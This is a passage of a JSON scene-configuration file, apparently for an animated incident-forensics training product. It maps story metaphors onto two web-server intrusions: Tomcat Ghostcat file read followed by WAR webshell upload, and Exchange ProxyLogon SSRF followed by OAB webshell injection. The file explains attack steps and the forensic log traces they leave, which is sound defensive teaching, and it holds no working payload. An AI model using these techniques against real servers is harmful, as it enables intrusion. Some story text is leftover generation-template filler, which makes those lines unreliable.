          "technicalTerm": "Malicious WAR archive deployed via /manager/text/deploy",
          "tone": "rose"
        },
        {
          "storyTerm": "Freshly compiled control page",
          "technicalTerm": "Jasper-compiled *_jsp.class execution inside the JVM",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F59E0B",
      "secondaryHex": "#38BDF8",
      "durationSec": 18,
      "callouts": [
        {
          "id": "net-tomcat-ghostcat-b-left",
          "tag": "ENTRY & STORY WORLD",
          "title": "Open street-facing freight shaft",
          "subtitle": "Exposed Tomcat AJP/1.3 connector on TCP port 8009",
          "tone": "amber"
        },
        {
          "id": "net-tomcat-ghostcat-b-right",
          "tag": "TARGET MECHANISM",
          "title": "Staff passcode sheet",
          "subtitle": "Read WEB-INF/web.xml or tomcat-users.xml (CVE-2020-1938)",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Open",
          "stageTag": "STAGE 01 · INITIAL ACCESS",
          "title": "AJP/1.3 Port 8009 javax.servlet.include.path_info File Read (CVE-2020-1938 Ghostcat)",
          "storyExcerpt": "Reaching straight into the unguarded freight shaft, the outsider tags a routine delivery slip with an internal storage path, persuading the elevator clerk to hand back private configuration blueprints…",
          "technicalParallel": "Under the hood, the observed step executes AJP13 Binary Packet (:8009): Magic=0x1234 Prefix=0x02 (JK_AJP13_FORWARD_REQUEST) (which executes the technical command / telemetry directive , AJP13 Binary…",
          "accentHex": "#F59E0B",
          "startSec": 0,
          "endSec": 6
        },
        {
          "id": 2,
          "shortLabel": "2. Dock",
          "stageTag": "STAGE 02 · PERSISTENCE",
          "title": "Authenticated WAR Upload via PUT /manager/text/deploy (localhost_access_log & catalina.out)",
          "storyExcerpt": "Armed with valid manager passcodes, the outsider walks up to the package loading dock and uploads a zipped application crate containing a hidden web control page. Continuing the same characters and room…",
          "technicalParallel": "Under the hood, the observed step executes Tomcat Access Log: \"PUT /manager/text/deploy?path=/metrics_probe HTTP/1.1\" 200 58 (which Transmits a crafted HTTP request , Tomcat Access Log: \"PUT…",
          "accentHex": "#22D3EE",
          "startSec": 6,
          "endSec": 12
        },
        {
          "id": 3,
          "shortLabel": "3. Page Live",
          "stageTag": "STAGE 03 · EXECUTION",
          "title": "Jasper JSP Compilation (work/Catalina/localhost/*/*_jsp.class) & JVM Child Process Execution",
          "storyExcerpt": "The moment the outsider visits their newly unpacked page, the building automatic translator compiles the script into live machine instructions inside the work directory and launches an operating system…",
          "technicalParallel": "Under the hood, the observed step executes Compiled JSP Artifact: /opt/tomcat/work/Catalina/localhost/metrics_probe/org/apache/jsp/health_jsp.class (which invokes or targets the host daemon/process…",
          "accentHex": "#38BDF8",
          "startSec": 12,
          "endSec": 18
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Freight Shaft",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Deploy Deck",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Audit Beam",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ]
    },
    "step-1": {
      "scenarioId": "dfir-apache-tomcat-ghostcat-ajp-manager-war-deployment",
      "sectionKey": "step-1",
      "sceneKind": "net-tomcat-ghostcat-step-1",
      "stageBadge": "STEP #1 · INITIAL ACCESS",
      "title": "AJP/1.3 Port 8009 javax.servlet.include.path_info File Read (CVE-2020-1938 Ghostcat)",
      "storyCue": "Reaching straight into the unguarded freight shaft, the outsider tags a routine delivery slip with an internal storage path, persuading the elevator clerk to hand back private configuration blueprints from behind the locked wall.",
      "technicalCue": "T1190 · INITIAL ACCESS — Because Apache Tomcat prior to 9.0.31 bound the AJP/1.3 connector on 0.0.0.0:8009 without a requiredSecret, the attacker sends a binary AJP13 Forward Request (magic 0x1234) setting…",
      "storyMappings": [
        {
          "storyTerm": "Unguarded freight shaft",
          "technicalTerm": "Unauthenticated AJP/1.3 port 8009 listener",
          "tone": "amber"
        },
        {
          "storyTerm": "Tagged internal storage path",
          "technicalTerm": "javax.servlet.include.path_info request attribute",
          "tone": "sky"
        },
        {
          "storyTerm": "Private configuration blueprints",
          "technicalTerm": "Arbitrary webapp file read under WEB-INF/",
          "tone": "rose"
        },
        {
          "storyTerm": "Freight shaft flaw",
          "technicalTerm": "Tomcat Ghostcat file read vulnerability (CVE-2020-1938)",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F59E0B",
      "secondaryHex": "#F59E0B",
      "durationSec": 15,
      "callouts": [
        {
          "id": "net-tomcat-ghostcat-step-1-left",
          "tag": "STEP 1 · FOCUS",
          "title": "Unguarded freight shaft",
          "subtitle": "Unauthenticated AJP/1.3 port 8009 listener",
          "tone": "amber"
        },
        {
          "id": "net-tomcat-ghostcat-step-1-right",
          "tag": "STEP 1 · ACTION",
          "title": "Tagged internal storage path",
          "subtitle": "javax.servlet.include.path_info request attribute",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Tags Slip",
          "stageTag": "STEP 01 · SETUP",
          "title": "Unguarded freight shaft",
          "storyExcerpt": "Reaching straight into the unguarded freight shaft, the outsider tags a routine delivery slip with an internal storage path, persuading the elevator clerk to hand back private configuration…",
          "technicalParallel": "Under the hood, the observed step executes AJP13 Binary Packet (:8009): Magic=0x1234 Prefix=0x02 (JK_AJP13_FORWARD_REQUEST) (which executes the technical command / telemetry directive , AJP13 Binary…",
          "accentHex": "#F59E0B",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Path",
          "stageTag": "STEP 01 · MECHANISM",
          "title": "Tagged internal storage path",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses tagged internal storage path to advance toward private configuration blueprints.",
          "technicalParallel": "Because Apache Tomcat prior to 9.0.31 bound the AJP/1.3 connector on 0.0.0.0:8009 without a requiredSecret, the attacker sends a binary AJP13 Forward Request (magic 0x1234) setting…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Flaw",
          "stageTag": "STEP 01 · EVIDENCE",
          "title": "Freight shaft flaw",
          "storyExcerpt": "Behind the scenes, freight shaft flaw captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Documented in IDS Alert Event 8009 (recording Vulnerability=CVE-2020-1938 , Apache Tomcat AJP Ghostcat, PortAndProtocol=TCP 8009 , Binary AJP/1.3 Magic 0x1234…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Freight Shaft",
          "position": [
            -4.3,
            4.2,
            8.4
          ],
          "target": [
            -2.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Deploy Deck",
          "position": [
            6.3,
            4.2,
            8.4
          ],
          "target": [
            4.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Audit Beam",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1190"
    },
    "step-2": {
      "scenarioId": "dfir-apache-tomcat-ghostcat-ajp-manager-war-deployment",
      "sectionKey": "step-2",
      "sceneKind": "net-tomcat-ghostcat-step-2",
      "stageBadge": "STEP #2 · PERSISTENCE",
      "title": "Authenticated WAR Upload via PUT /manager/text/deploy (localhost_access_log & catalina.out)",
      "storyCue": "Armed with valid manager passcodes, the outsider walks up to the package loading dock and uploads a zipped application crate containing a hidden web control page. Continuing the same characters and room from the previous beat, the operator performs two more concrete physical movements that an animator can stage without guessing, and each newly introduced prop has one explicit job.",
      "technicalCue": "T1505.003 · PERSISTENCE — Using the leaked manager-script credentials, the actor sends PUT /manager/text/deploy?path=/metrics_probe HTTP/1.1 on port 8080.",
      "storyMappings": [
        {
          "storyTerm": "Package loading dock",
          "technicalTerm": "Authenticated PUT /manager/text/deploy endpoint",
          "tone": "amber"
        },
        {
          "storyTerm": "Zipped application crate",
          "technicalTerm": "Uploaded malicious Web Application Archive (.war)",
          "tone": "sky"
        },
        {
          "storyTerm": "Valid manager passcodes",
          "technicalTerm": "Compromised manager-script role credentials",
          "tone": "rose"
        },
        {
          "storyTerm": "Dock arrival journal",
          "technicalTerm": "Tomcat localhost_access_log HTTP deployment trace",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F59E0B",
      "secondaryHex": "#F59E0B",
      "durationSec": 15,
      "callouts": [
        {
          "id": "net-tomcat-ghostcat-step-2-left",
          "tag": "STEP 2 · FOCUS",
          "title": "Package loading dock",
          "subtitle": "Authenticated PUT /manager/text/deploy endpoint",
          "tone": "amber"
        },
        {
          "id": "net-tomcat-ghostcat-step-2-right",
          "tag": "STEP 2 · ACTION",
          "title": "Zipped application crate",
          "subtitle": "Uploaded malicious Web Application Archive (.war)",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Dock",
          "stageTag": "STEP 02 · SETUP",
          "title": "Package loading dock",
          "storyExcerpt": "Armed with valid manager passcodes, the outsider walks up to the package loading dock and uploads a zipped application crate containing a hidden web control page.",
          "technicalParallel": "Under the hood, the observed step executes Tomcat Access Log: \"PUT /manager/text/deploy?path=/metrics_probe HTTP/1.1\" 200 58 (which Transmits a crafted HTTP request , Tomcat Access Log: \"PUT…",
          "accentHex": "#F59E0B",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Same Room",
          "stageTag": "STEP 02 · MECHANISM",
          "title": "Zipped application crate",
          "storyExcerpt": "Continuing the same characters and room from the previous beat, the operator performs two more concrete physical movements that an animator can stage without guessing, and each newly introduced…",
          "technicalParallel": "Using the leaked manager-script credentials, the actor sends PUT /manager/text/deploy?path=/metrics_probe HTTP/1.1 on port 8080.",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Left Dock",
          "stageTag": "STEP 02 · EVIDENCE",
          "title": "Dock arrival journal",
          "storyExcerpt": "Watchful investigators trace the unusual trail left across dock arrival journal while locking down valid manager passcodes.",
          "technicalParallel": "Documented in Linux Audit Event 200 (recording AccessLogFile=/opt/tomcat/logs/localhost_access_log.2026-11-03.txt, CatalinaLogEvent=HostConfig.deployWAR [/opt/tomcat/webapps/metrics_probe.war]…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Freight Shaft",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Deploy Deck",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Audit Beam",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1505.003"
    },
    "step-3": {
      "scenarioId": "dfir-apache-tomcat-ghostcat-ajp-manager-war-deployment",
      "sectionKey": "step-3",
      "sceneKind": "net-tomcat-ghostcat-step-3",
      "stageBadge": "STEP #3 · EXECUTION",
      "title": "Jasper JSP Compilation (work/Catalina/localhost/*/*_jsp.class) & JVM Child Process Execution",
      "storyCue": "The moment the outsider visits their newly unpacked page, the building automatic translator compiles the script into live machine instructions inside the work directory and launches an operating system command shell.",
      "technicalCue": "T1505.003 · EXECUTION — When the actor requests GET /metrics_probe/health.jsp, Apache Jasper compiles health.jsp into health_jsp.java and health_jsp.class inside…",
      "storyMappings": [
        {
          "storyTerm": "Automatic script translator",
          "technicalTerm": "Tomcat Jasper JSP-to-bytecode compiler",
          "tone": "amber"
        },
        {
          "storyTerm": "Compiled machine instructions",
          "technicalTerm": "Generated work/Catalina/localhost/*/*_jsp.class artifacts",
          "tone": "sky"
        },
        {
          "storyTerm": "Application runtime engine",
          "technicalTerm": "Java Virtual Machine (java) process running Tomcat",
          "tone": "rose"
        },
        {
          "storyTerm": "Launched command shell",
          "technicalTerm": "Unexpected /bin/sh or cmd.exe child process under java",
          "tone": "emerald"
        }
      ],
      "accentHex": "#38BDF8",
      "secondaryHex": "#10B981",
      "durationSec": 15,
      "callouts": [
        {
          "id": "net-tomcat-ghostcat-step-3-left",
          "tag": "STEP 3 · FOCUS",
          "title": "Automatic script translator",
          "subtitle": "Tomcat Jasper JSP-to-bytecode compiler",
          "tone": "amber"
        },
        {
          "id": "net-tomcat-ghostcat-step-3-right",
          "tag": "STEP 3 · ACTION",
          "title": "Compiled machine instructions",
          "subtitle": "Generated work/Catalina/localhost/*/*_jsp.class artifacts",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Page Live",
          "stageTag": "STEP 03 · SETUP",
          "title": "Automatic script translator",
          "storyExcerpt": "The moment the outsider visits their newly unpacked page, the building automatic translator compiles the script into live machine instructions inside the work directory and launches an…",
          "technicalParallel": "Under the hood, the observed step executes Compiled JSP Artifact: /opt/tomcat/work/Catalina/localhost/metrics_probe/org/apache/jsp/health_jsp.class (which invokes or targets the host daemon/process…",
          "accentHex": "#F59E0B",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Uses",
          "stageTag": "STEP 03 · MECHANISM",
          "title": "Compiled machine instructions",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses compiled machine instructions to advance toward application runtime engine.",
          "technicalParallel": "When the actor requests GET /metrics_probe/health.jsp, Apache Jasper compiles health.jsp into health_jsp.java and health_jsp.class inside /opt/tomcat/work/Catalina/localhost/metrics_probe/org/apache/jsp/…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Page Live",
          "stageTag": "STEP 03 · EVIDENCE",
          "title": "Launched command shell",
          "storyExcerpt": "Behind the scenes, launched command shell captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Documented in Linux Audit Event 59 (recording ParentJvmProcess=/usr/lib/jvm/jre/bin/java , org.apache.catalina.startup.Bootstrap…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Freight Shaft",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Deploy Deck",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Audit Beam",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1505.003"
    }
  },
  "dfir-exchange-ews-autodiscover-proxylogon-iis-forensics": {
    "briefing": {
      "scenarioId": "dfir-exchange-ews-autodiscover-proxylogon-iis-forensics",
      "sectionKey": "briefing",
      "sceneKind": "net-exchange-proxylogon-briefing",
      "stageBadge": "BRIEFING #0 · END-TO-END STORY DIORAMA",
      "mitreId": "T1190",
      "title": "Exchange HttpProxy, MSExchange Management & OAB Webshell Forensics — Story-to-Technical Overview",
      "storyCue": "Forensic auditors reconstruct a break-in at a corporate mail building by tracing three linked clues: first the front-desk forwarding slips that misrouted a stranger into the rear office, next the management ledger recording a tampered address-book path, and finally the fresh workshop printouts proving a hidden control page ran commands.",
      "technicalCue": "INITIAL ACCESS: Exchange Frontend HttpProxy Log Analysis (V15\\Logging\\HttpProxy\\*\\*.LOG) -> PERSISTENCE: Exchange Management Log (MSExchange Management EventID 1) Set-OabVirtualDirectory & New-MailboxExportRequest -> EXECUTION: ASP.NET Dynamic Compilation (Temporary ASP.NET Files) & w3wp.exe Child Shell (Sysmon EventID 1 & 11)",
      "storyMappings": [
        {
          "storyTerm": "Front-desk forwarding slips",
          "technicalTerm": "Exchange Frontend HttpProxy routing logs",
          "tone": "amber"
        },
        {
          "storyTerm": "Tampered address-book path",
          "technicalTerm": "MSExchange Management Set-OabVirtualDirectory EventID 1",
          "tone": "sky"
        },
        {
          "storyTerm": "Fresh workshop printouts",
          "technicalTerm": "ASP.NET dynamic compilation in Temporary ASP.NET Files",
          "tone": "rose"
        },
        {
          "storyTerm": "Mailroom clerk running tools",
          "technicalTerm": "w3wp.exe spawning unexpected command child processes",
          "tone": "emerald"
        }
      ],
      "accentHex": "#38BDF8",
      "secondaryHex": "#F43F5E",
      "durationSec": 18,
      "callouts": [
        {
          "id": "net-exchange-proxylogon-b-left",
          "tag": "ENTRY & STORY WORLD",
          "title": "Front-desk forwarding slips",
          "subtitle": "Exchange Frontend HttpProxy routing logs",
          "tone": "amber"
        },
        {
          "id": "net-exchange-proxylogon-b-right",
          "tag": "TARGET MECHANISM",
          "title": "Tampered address-book path",
          "subtitle": "MSExchange Management Set-OabVirtualDirectory EventID 1",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Spot Slip",
          "stageTag": "STAGE 01 · INITIAL ACCESS",
          "title": "Exchange Frontend HttpProxy Log Analysis (V15\\Logging\\HttpProxy\\*\\*.LOG)",
          "storyExcerpt": "Auditors begin at the reception counter logbook and spot an unusual courier slip addressed to a static graphic shelf that unexpectedly routed straight into the rear backend mail engine.",
          "technicalParallel": "Under the hood, the observed step executes Log Path: C:\\Program Files\\Microsoft\\Exchange Server\\V15\\Logging\\HttpProxy\\Autodiscover\\*.LOG (which executes the technical command / telemetry directive , Log…",
          "accentHex": "#38BDF8",
          "startSec": 0,
          "endSec": 6
        },
        {
          "id": 2,
          "shortLabel": "2. Path",
          "stageTag": "STAGE 02 · PERSISTENCE",
          "title": "Exchange Management Log (MSExchange Management EventID 1) Set-OabVirtualDirectory & New-MailboxExportRequest",
          "storyExcerpt": "Following the timestamp into the supervisor office ledger, investigators catch an administrative order rewriting an offline address-book web link so its description field hides an executable page script.",
          "technicalParallel": "Under the hood, the observed step executes Event Log Channel: \"MSExchange Management\" EventID 1 (Cmdlet Execution) (which executes the technical command / telemetry directive , Event Log Channel…",
          "accentHex": "#22D3EE",
          "startSec": 6,
          "endSec": 12
        },
        {
          "id": 3,
          "shortLabel": "3. Even If",
          "stageTag": "STAGE 03 · EXECUTION",
          "title": "ASP.NET Dynamic Compilation (Temporary ASP.NET Files) & w3wp.exe Child Shell (Sysmon EventID 1 & 11)",
          "storyExcerpt": "Even if the intruder tears down the wall flyer afterward, the building print shop retains freshly compiled proof plates in its temporary drawer and security cameras catch the mailroom clerk carrying…",
          "technicalParallel": "Under the hood, the observed step executes Sysmon EventID 11: C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Temporary ASP.NET Files\\root\\...\\App_Web_supp.aspx.cdcab7d2.dll (which executes the technical…",
          "accentHex": "#F43F5E",
          "startSec": 12,
          "endSec": 18
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Front Desk",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Mail Archive",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Audit Sweep",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ]
    },
    "step-1": {
      "scenarioId": "dfir-exchange-ews-autodiscover-proxylogon-iis-forensics",
      "sectionKey": "step-1",
      "sceneKind": "net-exchange-proxylogon-step-1",
      "stageBadge": "STEP #1 · INITIAL ACCESS",
      "title": "Exchange Frontend HttpProxy Log Analysis (V15\\Logging\\HttpProxy\\*\\*.LOG)",
      "storyCue": "Auditors begin at the reception counter logbook and spot an unusual courier slip addressed to a static graphic shelf that unexpectedly routed straight into the rear backend mail engine.",
      "technicalCue": "T1190 · INITIAL ACCESS — When an external request manipulates the X-BEResource or X-AnonResource-Backend cookie to proxy an unauthenticated Frontend request directly to the Exchange Backend (:444) /ecp/ or…",
      "storyMappings": [
        {
          "storyTerm": "Reception counter logbook",
          "technicalTerm": "V15\\Logging\\HttpProxy\\*\\*.log proxy audit files",
          "tone": "amber"
        },
        {
          "storyTerm": "Static graphic shelf address",
          "technicalTerm": "Crafted /ecp/*.js path triggering SSRF routing",
          "tone": "sky"
        },
        {
          "storyTerm": "Rear backend mail engine",
          "technicalTerm": "Internal Exchange backend RPC and EWS services",
          "tone": "rose"
        },
        {
          "storyTerm": "Strange routing stamp",
          "technicalTerm": "X-BEResource cookie directing arbitrary backend calls",
          "tone": "emerald"
        }
      ],
      "accentHex": "#38BDF8",
      "secondaryHex": "#38BDF8",
      "durationSec": 15,
      "callouts": [
        {
          "id": "net-exchange-proxylogon-step-1-left",
          "tag": "STEP 1 · FOCUS",
          "title": "Reception counter logbook",
          "subtitle": "V15\\Logging\\HttpProxy\\*\\*.log proxy audit files",
          "tone": "amber"
        },
        {
          "id": "net-exchange-proxylogon-step-1-right",
          "tag": "STEP 1 · ACTION",
          "title": "Static graphic shelf address",
          "subtitle": "Crafted /ecp/*.js path triggering SSRF routing",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Spot Slip",
          "stageTag": "STEP 01 · SETUP",
          "title": "Reception counter logbook",
          "storyExcerpt": "Auditors begin at the reception counter logbook and spot an unusual courier slip addressed to a static graphic shelf that unexpectedly routed straight into the rear backend mail engine.",
          "technicalParallel": "Under the hood, the observed step executes Log Path: C:\\Program Files\\Microsoft\\Exchange Server\\V15\\Logging\\HttpProxy\\Autodiscover\\*.LOG (which executes the technical command / telemetry directive , Log…",
          "accentHex": "#38BDF8",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Uses Rear",
          "stageTag": "STEP 01 · MECHANISM",
          "title": "Static graphic shelf address",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses static graphic shelf address to advance toward rear backend mail engine.",
          "technicalParallel": "When an external request manipulates the X-BEResource or X-AnonResource-Backend cookie to proxy an unauthenticated Frontend request directly to the Exchange Backend (:444) /ecp/ or /ews/exchange.asmx…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Rear Mail",
          "stageTag": "STEP 01 · EVIDENCE",
          "title": "Strange routing stamp",
          "storyExcerpt": "Behind the scenes, strange routing stamp captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Documented in Network Event 200 (recording ForensicLogDir=V15\\Logging\\HttpProxy\\Ecp\\*.LOG, ClientIpAddress=198.51.100.112, AnchorMailboxAnomaly=ServerInfo~EXCH01.corp.local:444/ecp/DDI/DDIService.svc…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Front Desk",
          "position": [
            -4.3,
            4.2,
            8.4
          ],
          "target": [
            -2.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Mail Archive",
          "position": [
            6.3,
            4.2,
            8.4
          ],
          "target": [
            4.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Audit Sweep",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1190"
    },
    "step-2": {
      "scenarioId": "dfir-exchange-ews-autodiscover-proxylogon-iis-forensics",
      "sectionKey": "step-2",
      "sceneKind": "net-exchange-proxylogon-step-2",
      "stageBadge": "STEP #2 · PERSISTENCE",
      "title": "Exchange Management Log (MSExchange Management EventID 1) Set-OabVirtualDirectory & New-MailboxExportRequest",
      "storyCue": "Following the timestamp into the supervisor office ledger, investigators catch an administrative order rewriting an offline address-book web link so its description field hides an executable page script.",
      "technicalCue": "T1505.003 · PERSISTENCE — Using the proxied backend session, the actor invokes the Exchange Management cmdlet Set-OabVirtualDirectory (injecting JScript webshell code into the ExternalUrl property) followed by…",
      "storyMappings": [
        {
          "storyTerm": "Supervisor office ledger",
          "technicalTerm": "MSExchange Management EventID 1 administrative log",
          "tone": "amber"
        },
        {
          "storyTerm": "Rewritten address-book link",
          "technicalTerm": "Set-OabVirtualDirectory ExternalUrl payload injection",
          "tone": "sky"
        },
        {
          "storyTerm": "Resetting the directory",
          "technicalTerm": "Reset-OabVirtualDirectory writing payload to webroot",
          "tone": "rose"
        },
        {
          "storyTerm": "Hidden page script",
          "technicalTerm": "Dropped ASPX webshell embedded inside OAB config",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F59E0B",
      "secondaryHex": "#38BDF8",
      "durationSec": 15,
      "callouts": [
        {
          "id": "net-exchange-proxylogon-step-2-left",
          "tag": "STEP 2 · FOCUS",
          "title": "Supervisor office ledger",
          "subtitle": "MSExchange Management EventID 1 administrative log",
          "tone": "amber"
        },
        {
          "id": "net-exchange-proxylogon-step-2-right",
          "tag": "STEP 2 · ACTION",
          "title": "Rewritten address-book link",
          "subtitle": "Set-OabVirtualDirectory ExternalUrl payload injection",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Web Link",
          "stageTag": "STEP 02 · SETUP",
          "title": "Supervisor office ledger",
          "storyExcerpt": "Following the timestamp into the supervisor office ledger, investigators catch an administrative order rewriting an offline address-book web link so its description field hides an executable…",
          "technicalParallel": "Under the hood, the observed step executes Event Log Channel: \"MSExchange Management\" EventID 1 (Cmdlet Execution) (which executes the technical command / telemetry directive , Event Log Channel…",
          "accentHex": "#38BDF8",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Link",
          "stageTag": "STEP 02 · MECHANISM",
          "title": "Rewritten address-book link",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses rewritten address-book link to advance toward resetting the directory.",
          "technicalParallel": "Using the proxied backend session, the actor invokes the Exchange Management cmdlet Set-OabVirtualDirectory (injecting JScript webshell code into the ExternalUrl property) followed by…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Page",
          "stageTag": "STEP 02 · EVIDENCE",
          "title": "Hidden page script",
          "storyExcerpt": "Behind the scenes, hidden page script captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Documented in WinEvent Event 1 (recording LogChannel=MSExchange Management , EventID 1, ExecutedCmdlet=New-MailboxExportRequest / Set-OabVirtualDirectory…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Front Desk",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Mail Archive",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Audit Sweep",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1505.003"
    },
    "step-3": {
      "scenarioId": "dfir-exchange-ews-autodiscover-proxylogon-iis-forensics",
      "sectionKey": "step-3",
      "sceneKind": "net-exchange-proxylogon-step-3",
      "stageBadge": "STEP #3 · EXECUTION",
      "title": "ASP.NET Dynamic Compilation (Temporary ASP.NET Files) & w3wp.exe Child Shell (Sysmon EventID 1 & 11)",
      "storyCue": "Even if the intruder tears down the wall flyer afterward, the building print shop retains freshly compiled proof plates in its temporary drawer and security cameras catch the mailroom clerk carrying heavy workshop tools.",
      "technicalCue": "T1505.003 · EXECUTION — When the external actor requests POST /aspnet_client/supp.aspx, IIS w3wp.exe compiles the page via csc.exe into C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Temporary ASP.NET…",
      "storyMappings": [
        {
          "storyTerm": "Compiled proof plates",
          "technicalTerm": "Compiled DLLs in Temporary ASP.NET Files cache",
          "tone": "amber"
        },
        {
          "storyTerm": "Mailroom clerk process",
          "technicalTerm": "IIS w3wp.exe worker handling the webshell request",
          "tone": "sky"
        },
        {
          "storyTerm": "Heavy workshop tools",
          "technicalTerm": "Spawned cmd.exe, powershell.exe, or credential dumpers",
          "tone": "rose"
        },
        {
